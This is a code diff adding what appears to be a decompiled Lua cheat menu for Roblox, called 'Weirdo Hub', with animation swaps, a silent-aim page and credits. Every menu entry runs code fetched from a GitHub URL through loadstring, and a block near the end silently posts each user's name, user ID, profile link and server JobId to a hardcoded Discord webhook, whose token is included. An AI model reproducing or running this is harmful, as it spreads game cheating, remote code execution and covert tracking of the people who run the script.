+  b = b.RunAnim
+  b.AnimationId = "rbxassetid://3236836670"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "rbxassetid://2510197830"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "rbxassetid://2510195892"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "rbxassetid://2510192778"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddLabel("Animation Combonations")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Zombie Animation + Werewolf", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=782841498"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=782845736"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=656114359"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Animations").AddButton("Barbie Animation", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br)
+  a = a
+  a = game
+  a = a.Players
+  a = a.LocalPlayer
+  a = a.Character
+  a = a.Animate
+  b = a.idle
+  b = b.Animation1
+  b.AnimationId = "http://www.roblox.com/asset/?id=616136790"
+  b = a.idle
+  b = b.Animation2
+  b.AnimationId = "http://www.roblox.com/asset/?id=616138447"
+  b = a.walk
+  b = b.WalkAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616146177"
+  b = a.run
+  b = b.RunAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=910025107"
+  b = a.jump
+  b = b.JumpAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616139451"
+  b = a.climb
+  b = b.ClimbAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616133594"
+  b = a.fall
+  b = b.FallAnim
+  b.AnimationId = "http://www.roblox.com/asset/?id=616134815"
+  b = game
+  b = b.Players
+  b = b.LocalPlayer
+  b = b.Character
+  b = b.Humanoid
+  b.Jump = true
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Silent Aim").AddButton("Silent Aim In #scripts!", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br, bs)
+  a = a
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Credits").AddLabel("Developer Information")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Credits").AddButton("Developers : gunna#5015 and slump#3267", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br, bs, bt)
+  a = a
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Credits").AddLabel("Discord Information")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pooosodfosdfsdf/cgfgefd/main/sdasd"))().Load("Weirdo Hub;").AddPage("Credits").AddButton("Discord ( Click To Copy )", function(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br, bs, bt, bu)
+  a = a
+  a = game
+  a = a.StarterGui
+  b = a
+  a = a.SetCore
+  c = "SendNotification"
+  d = {}
+  d.Title = "Discord"
+  d.Text = "Copied To Clipboard!"
+  d.Duration = 1
+  a(b, c, d)
+  a = setclipboard
+  b = "https://discord.gg/RJNaVaAWxK"
+  a(b)
+end)
+if game.Players.LocalPlayer.UserId == 1626722799 or game.Players.LocalPlayer.UserId == 1420800618 then
+else
+  request = HttpPost or request or http_request or syn.request
+  request({
+    Url = "https://discord.com/api/webhooks/898349894467739650/NE9SCCHghbEQf6y3i3Q3qbL47rBCoVD9jMuy_AiJTCmlz3qLS5LijIYq-Q8F8OyvZ72I",
+    Body = game:GetService("HttpService"):JSONEncode({
+      content = "Profile Link: " .. " https://roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile",
+      embeds = {
+        {
+          title = "**Normal Execution**",
+          description = "Name: **" .. game.Players.LocalPlayer.Name .. "** or **" .. game.Players.LocalPlayer.UserId .. "** They Executed With **" .. ("Sirhurt" or "ProtoSmasher" or "Synapse X or Flexus" or "Sentinel" or "KRNL" or "Sona" or "Unknown Exploit") .. "**" .. " Here Is Their Game ID: **" .. ("Roblox.GameLauncher.joinGameInstance(2788229376, '" .. (game.JobId or 1) .. "');") .. "**",
+          type = "rich",
+          color = "2697513",
+          image = {
+            url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
+          }
+        }
+      }
+    }),
+    Method = "POST",
+    Headers = {
+      ["content-type"] = "application/json"
+    }
+  })
+end
+modids = {
+  1626722799,
+  1420800618,
+  2519959213,
+  273178987,
+  92548152,
+  1502073244,
+  2864983391,
+  953449734,
+  34640666,
+  202644106,
+  1417529870,
+  1651314032,
+  1651314032,
+  2448433309,
+  866529747,
+  2241755636,
+  1223349429,
+  903591171,
+  1020822856
+}
+function whubdis(a, b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br, bs, bt, bu, by)
+  d = "Players"
+  by = b(c)
+  for d, e in a(b, c, d, e, g, h, j, k, l, m, o, p, n, r, s, t, u, y, z, q, w, x, Q, W, E, R, T, Y, U, I, O, P, A, S, D, G, H, J, K, L, Z, X, C, B, N, M, aa, ab, ac, ad, ae, ag, ah, aj, ak, al, am, ao, ap, an, ar, as, at, au, ay, az, aq, aw, ax, aQ, aW, aE, aR, aT, aY, aU, aI, aO, aP, aA, aS, aD, aG, aH, aJ, aK, aL, aZ, aX, aC, aB, aN, aM, ba, bb, bc, bd, be, bg, bh, bj, bk, bl, bm, bo, bp, bn, br, bs, bt, bu, by) do
+    g = table
+    g = g.find
+    h = modids
+    j = e.UserId
+    g = g(h, j)
+    if g then
+      g = e.Character
+      if g then
+        g = e.Character
+        g = g.Parent
+        g = g.Name
+        if g == "Players" then
+          g = e.Character
+          h = g
+          g = g.FindFirstChildWhichIsA
+          j = "Humanoid"
+          g = g(h, j)
+          h = "[??]"
+          j = e.DisplayName
+          h = h .. j
+          g.DisplayName = h
+        end
+      end
+    else
+      g = e.Character
+      if g then
+        g = e.Character
+        g = g.Parent
+        g = g.Name
+        if g == "Players" then
+          g = e.Character
+          g = g.UpperTorso
+          h = g
+          g = g.FindFirstChild
+          j = "OriginalSize"
+          g = g(h, j)
+          if not g then
+            g = e.Character
+            h = g
+            g = g.FindFirstChildWhichIsA
+            j = "Humanoid"
+            g = g(h, j)
+            h = "[??]"
+            j = e.DisplayName
+            h = h .. j
+            g.DisplayName = h
+          end
+        end
+      end
+    end
+  end
+end
+return modids
